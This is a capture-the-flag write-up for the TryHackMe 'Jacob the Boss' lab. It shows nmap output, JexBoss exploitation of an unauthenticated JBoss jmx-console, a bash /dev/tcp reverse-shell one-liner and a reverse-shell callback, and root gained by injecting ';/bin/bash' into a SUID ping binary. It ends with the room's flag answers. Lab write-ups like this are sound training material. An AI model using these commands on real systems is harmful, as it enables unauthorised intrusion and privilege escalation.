# Jacob the Boss

Find a way in and learn a little more.

[Jacob the Boss](https://tryhackme.com/room/jacobtheboss)

## Topic's

- Network Enumeration
- Jboss (Exploitation)
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Go on, it's your machine!

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

**First of all, add the **jacobtheboss.box\*_ address to your hosts file._

Anyway, learn a little more, have fun!

```
kali@kali:~/CTFs/tryhackme/Jacob the Boss$ sudo nmap -A -sS -sC -sV --script vuln -O 10.10.62.239
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 14:28 CEST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for jacobtheboss.box (10.10.62.239)
Host is up (0.034s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners:
|   cpe:/a:openbsd:openssh:7.4:
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=jacobtheboss.box
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://jacobtheboss.box:80/
|     Form id: q
|     Form action: http://jacobtheboss.box/index.php?
|
|     Path: http://jacobtheboss.box:80/index.php?post/2020/07/31/Welcome-to-Dotclear%21
|     Form id: comment-form
|     Form action: http://jacobtheboss.box/index.php?post/2020/07/31/Welcome-to-Dotclear%21#pr
|
|     Path: http://jacobtheboss.box:80/index.php?post/2020/07/31/Welcome-to-Dotclear%21
|     Form id: q
|     Form action: http://jacobtheboss.box/index.php?
|
|     Path: http://jacobtheboss.box:80/index.php?archive
|     Form id: q
|     Form action: http://jacobtheboss.box/index.php?
|
|     Path: http://jacobtheboss.box:80/index.php?
|     Form id: q
|     Form action: http://jacobtheboss.box/index.php?
|
|     Path: http://jacobtheboss.box:80/index.php?archive/2020/07
|     Form id: q
|_    Form action: http://jacobtheboss.box/index.php?
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /icons/: Potentially interesting folder w/ directory listing
|   /public/: Potentially interesting folder w/ directory listing
|_  /themes/: Potentially interesting folder w/ directory listing
| http-fileupload-exploiter:
|
|     Couldn't find a file-type field.
|
|_    Couldn't find a file-type field.
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners:
|   cpe:/a:apache:http_server:2.4.6:
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       CVE-2013-4352   4.3     https://vulners.com/cve/CVE-2013-4352
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
111/tcp  open  rpcbind     2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
1099/tcp open  java-object Java Object Serialization
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   NULL:
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
|_rmi-vuln-classloader: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql       MariaDB (unauthorized)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
4444/tcp open  java-rmi    Java RMI
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
4445/tcp open  java-object Java Object Serialization
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
4446/tcp open  java-object Java Object Serialization
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=jacobtheboss.box
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://jacobtheboss.box:8080/jmx-console/HtmlAdaptor?action=displayMBeans
|     Form id: applyfilter
|_    Form action: HtmlAdaptor?action=displayMBeans
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /web-console/ServerInfo.jsp: JBoss Console
|   /web-console/Invoker: JBoss Console
|   /invoker/JMXInvokerServlet: JBoss Console
|_  /jmx-console/: JBoss Console
| http-internal-ip-disclosure:
|_  Internal IP Leaked: 10
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2010-0738:
|_  /jmx-console/: Authentication was not required
8083/tcp open  http        JBoss service httpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.80%I=7%D=10/15%Time=5F884083%P=x86_64-pc-linux-gnu%r(N
SF:ULL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xpo\xa5\xaf;ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0
SF:\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0\0
SF:q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.Na
SF:mingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.Rem
SF:oteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server\.
SF:RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\x1
SF:0jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0zU\xe3\xae\0\0\x01u,:\x91\xd
SF:9\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.80%I=7%D=10/15%Time=5F884089%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.80%I=7%D=10/15%Time=5F884089%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=40356%PV=Y%DS=2%DC=T%G=Y%TM=5F8841
OS:87%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%II=I%TS=A)SEQ(SP=
OS:103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I
OS:%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O
OS:5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6
OS:=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   33.86 ms 10.8.0.1
2   34.00 ms jacobtheboss.box (10.10.62.239)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 296.73 seconds
```

```
* --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * |
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://jacobtheboss.box:8080/ **

 [*] Checking jmx-console:
  [ VULNERABLE ]
 [*] Checking web-console:
  [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:
  [ VULNERABLE ]
 [*] Checking admin-console:
  [ OK ]
 [*] Checking Application Deserialization:
  [ OK ]
 [*] Checking Servlet Deserialization:
  [ OK ]
 [*] Checking Jenkins:
  [ OK ]
 [*] Checking Struts2:
  [ OK ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   If successful, this operation will provide a simple command shell to execute
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080/. Please wait...

 * Successfully deployed code! Starting command shell. Please wait...

# ----------------------------------------- # LOL # ----------------------------------------- #

 * http://jacobtheboss.box:8080/:

# ----------------------------------------- #

 * For a Reverse Shell (like meterpreter =]), type the command:

   jexremote=YOUR_IP:YOUR_PORT

   Example:
     Shell>jexremote=192.168.0.10:4444

   Or use other techniques of your choice, like:
     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1

   And so on... =]

# ----------------------------------------- #

  Failed to check for updates
Linux jacobtheboss.box 3.10.0-1127.18.2.el7.x86_64 #1 SMP Sun Jul 26 15:27:06 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
'  Failed to check for updates
\\S
Kernel \\r on an \\m

'  Failed to check for updates
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
'
[Type commands or "exit" to finish]
Shell> cd /home
 Failed to check for updates
'
[Type commands or "exit" to finish]
Shell> pwd
 Failed to check for updates
/
'
[Type commands or "exit" to finish]
Shell> cat /home/jacob/user.txt
 Failed to check for updates
f4d491f280de360cc49e26ca1587cbcc
'
[Type commands or "exit" to finish]
Shell>
```

```
Shell> find / -type f -user root -perm -u=s 2>/dev/null
 Failed to check for updates
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
'
[Type commands or "exit" to finish]
Shell> jexremote=10.8.106.222:4444
```

```
kali@kali:~/CTFs/tryhackme/Jacob the Boss$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.62.239] 56188
id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
/usr/bin/pingsys "10.10.62.239;/bin/bash"
PING 10.10.62.239 (10.10.62.239) 56(84) bytes of data.
64 bytes from 10.10.62.239: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 10.10.62.239: icmp_seq=2 ttl=64 time=0.030 ms
64 bytes from 10.10.62.239: icmp_seq=3 ttl=64 time=0.030 ms
64 bytes from 10.10.62.239: icmp_seq=4 ttl=64 time=0.029 ms

--- 10.10.62.239 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.018/0.026/0.030/0.008 ms
id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
cd /root
ls
anaconda-ks.cfg
jboss.sh
original-ks.cfg
root.txt
cat root.txt
29a5641eaa0c01abe5749608c8232806
```

1. user.txt

`f4d491f280de360cc49e26ca1587cbcc`

2. root.txt

`29a5641eaa0c01abe5749608c8232806`
